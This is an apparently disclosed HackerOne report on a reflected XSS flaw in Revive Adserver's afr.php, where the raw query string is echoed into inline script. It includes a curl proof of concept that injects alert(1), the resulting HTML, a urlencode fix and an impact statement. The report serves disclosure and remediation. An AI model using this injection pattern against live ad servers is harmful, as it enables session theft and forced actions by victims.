# Reflected XSS on www/delivery/afr.php

## Report Details
- **Report ID**: 775693
- **URL**: https://hackerone.com/reports/775693
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-01-15T15:52:04.909Z
- **Disclosed**: 2020-01-21T13:13:48.835Z

## Reporter
- **Username**: jacopotediosi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: revive_adserver

## Vulnerability Information
At line 4381, $_SERVER['QUERY_STRING'], which is an untrusted user input, is assigned to the $dest variable.
Then at lines 4386-4387 $dest is printed into HTML code in two separate places.

PoC:
~~~~
curl "domain.com/www/delivery/afr.php?refresh=10000&\")',10000000);alert(1);setTimeout('alert(\""
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'>
<html xmlns='http://www.w3.org/1999/xhtml' xml:lang='en' lang='en'>
<head>
<title>Advertisement</title>

    <script type='text/javascript'><!--// <![CDATA[
        setTimeout('window.location.replace("http://domain.com/www/delivery/afr.php?refresh=10000&")',10000000);alert(1);setTimeout('alert("&loc=")', 10000000);
    // ]]> --></script><noscript><meta http-equiv='refresh' content='10000;url=http://domain.com/www/delivery/afr.php?refresh=10000&")',10000000);alert(1);setTimeout('alert("&loc='></noscript>
    <style type='text/css'>
body {margin:0; height:100%; background-color:transparent; width:100%; text-align:center;}
</style>
</head>
<body>

</body>
</html>
~~~~

Suggested remediation:
I suggest to change line 4381 from `$dest = MAX_commonGetDeliveryUrl($conf['file']['frame']).'?'.$_SERVER['QUERY_STRING'];` to `$dest = MAX_commonGetDeliveryUrl($conf['file']['frame']).'?'.urlencode($_SERVER['QUERY_STRING']);` in both files /www/delivery/afr.php and /www/delivery_dev/afr.php

## Impact

An attacker could use this XSS to steal session cookies (if readable via javascript, I didn't check) or transform it to a CSRF and cause involuntary actions to be performed by a privileged user

## Attachments
No attachments
